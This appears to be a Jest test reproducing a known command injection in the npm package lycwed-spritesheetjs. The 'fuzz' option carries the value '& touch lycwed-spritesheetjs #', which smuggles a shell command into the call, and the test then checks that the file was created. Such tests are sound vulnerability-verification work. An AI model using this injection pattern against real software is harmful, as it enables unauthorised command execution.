// https://snyk.io/vuln/SNYK-JS-LYCWEDSPRITESHEETJS-1050428
test("Command Injection in lycwed-spritesheetjs", () => {
  let spritesheet = require("lycwed-spritesheetjs");
  const fs = require("fs");
  const path = "./lycwed-spritesheetjs";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  spritesheet(
    "./",
    {
      fuzz: "& touch lycwed-spritesheetjs #",
      ext: "json",
    },
    function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    }
  );
});
